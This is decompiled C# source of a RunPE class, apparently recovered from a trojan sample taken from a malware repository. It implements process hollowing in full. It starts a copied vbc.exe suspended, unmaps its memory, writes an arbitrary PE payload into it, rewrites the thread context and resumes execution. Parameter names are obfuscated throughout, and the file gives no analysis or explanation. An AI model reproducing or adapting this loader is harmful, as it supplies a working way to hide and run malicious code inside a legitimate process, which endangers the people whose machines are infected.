// Decompiled with JetBrains decompiler
// Type: Phulli.RunPE
// Assembly: Phulli, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5588EA96-561C-40B7-9B78-06ECD0A07CB4
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-d1330d349bfbd3aea545fa08ef63339e82a3f4d04e27216ecc4c45304f079264.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;

namespace Phulli
{
  public class RunPE
  {
    [DebuggerNonUserCode]
    public RunPE()
    {
    }

    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern bool WriteProcessMemory(
      IntPtr Ð,
      IntPtr Ö,
      byte[] Æ,
      IntPtr Ü,
      ref IntPtr Ù);

    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern bool VirtualProtectEx(IntPtr Ö, IntPtr Ë, IntPtr Ó, int Â, ref int Ð);

    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern IntPtr VirtualAllocEx(IntPtr Á, IntPtr Æ, IntPtr Ú, int Û, int Ë);

    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern bool SetThreadContext(IntPtr Ã, uint[] Ì);

    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int ResumeThread(IntPtr Á);

    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern bool ReadProcessMemory(
      IntPtr Ø,
      IntPtr Å,
      ref IntPtr Ç,
      IntPtr ß,
      ref IntPtr Ò);

    [DllImport("ntdll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern uint NtUnmapViewOfSection(IntPtr Æ, IntPtr Æ);

    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern bool GetThreadContext(IntPtr Â, uint[] Þ);

    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern bool CreateProcessA(
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string Ÿ,
      StringBuilder È,
      IntPtr Û,
      IntPtr Ò,
      bool Ã,
      int Þ,
      IntPtr Ø,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string ß,
      byte[] Ð,
      IntPtr[] É);

    public static void PE(byte[] data)
    {
      string str1 = Assembly.GetEntryAssembly().Location;
      if (Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles).Contains("x86"))
      {
        string sourceFileName = Conversions.ToString(Environment.SystemDirectory[0]) + ":\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe";
        string str2 = Path.ChangeExtension(Path.Combine(Path.GetTempPath() + Path.GetRandomFileName() + "\\", "vbc"), "exe");
        Directory.CreateDirectory(Path.GetDirectoryName(str2));
        File.Copy(sourceFileName, str2);
        str1 = str2;
      }
      byte[] numArray1 = data;
      int int32 = BitConverter.ToInt32(numArray1, 60);
      int int16 = (int) BitConverter.ToInt16(numArray1, checked (int32 + 6));
      IntPtr Ü1 = new IntPtr(BitConverter.ToInt32(numArray1, checked (int32 + 84)));
      byte[] numArray2 = new byte[68];
      IntPtr[] numArray3 = new IntPtr[4];
      string str3 = (string) null;
      ref string local1 = ref str3;
      StringBuilder È = new StringBuilder(str1);
      IntPtr num1;
      IntPtr Û = num1;
      IntPtr Ò = num1;
      IntPtr Ø = num1;
      string str4 = (string) null;
      ref string local2 = ref str4;
      byte[] Ð1 = numArray2;
      IntPtr[] É = numArray3;
      if (!RunPE.CreateProcessA(ref local1, È, Û, Ò, false, 4, Ø, ref local2, Ð1, É))
        return;
      uint[] numArray4 = new uint[179];
      numArray4[0] = 65538U;
      IntPtr Ç;
      IntPtr num2;
      if (RunPE.GetThreadContext(numArray3[1], numArray4) && RunPE.ReadProcessMemory(numArray3[0], new IntPtr(checked ((long) numArray4[41] + 8L)), ref Ç, new IntPtr(4), ref num2) && RunPE.NtUnmapViewOfSection(numArray3[0], Ç) == 0U)
      {
        IntPtr Á = numArray3[0];
        IntPtr num3 = new IntPtr(BitConverter.ToInt32(numArray1, checked (int32 + 52)));
        IntPtr Æ1 = num3;
        IntPtr num4 = new IntPtr(BitConverter.ToInt32(numArray1, checked (int32 + 80)));
        IntPtr Ú = num4;
        IntPtr Ö1 = RunPE.VirtualAllocEx(Á, Æ1, Ú, 12288, 64);
        bool flag = RunPE.WriteProcessMemory(numArray3[0], Ö1, numArray1, Ü1, ref num2);
        int num5 = checked (int16 - 1);
        int num6 = 0;
        while (num6 <= num5)
        {
          int[] dst1 = new int[10];
          Buffer.BlockCopy((Array) numArray1, checked (int32 + 248 + num6 * 40), (Array) dst1, 0, 40);
          byte[] dst2 = new byte[checked (dst1[4] - 1 + 1)];
          Buffer.BlockCopy((Array) numArray1, dst1[5], (Array) dst2, 0, dst2.Length);
          IntPtr Ð2 = numArray3[0];
          num4 = new IntPtr(checked (Ö1.ToInt32() + dst1[3]));
          IntPtr Ö2 = num4;
          byte[] Æ2 = dst2;
          num3 = new IntPtr(dst2.Length);
          IntPtr Ü2 = num3;
          ref IntPtr local3 = ref num2;
          flag = RunPE.WriteProcessMemory(Ð2, Ö2, Æ2, Ü2, ref local3);
          checked { ++num6; }
        }
        IntPtr Ð3 = numArray3[0];
        num4 = new IntPtr(checked ((long) numArray4[41] + 8L));
        IntPtr Ö3 = num4;
        byte[] bytes = BitConverter.GetBytes(Ö1.ToInt32());
        num3 = new IntPtr(4);
        IntPtr Ü3 = num3;
        ref IntPtr local4 = ref num2;
        flag = RunPE.WriteProcessMemory(Ð3, Ö3, bytes, Ü3, ref local4);
        numArray4[44] = checked ((uint) (Ö1.ToInt32() + BitConverter.ToInt32(numArray1, int32 + 40)));
        RunPE.SetThreadContext(numArray3[1], numArray4);
      }
      RunPE.ResumeThread(numArray3[1]);
    }
  }
}
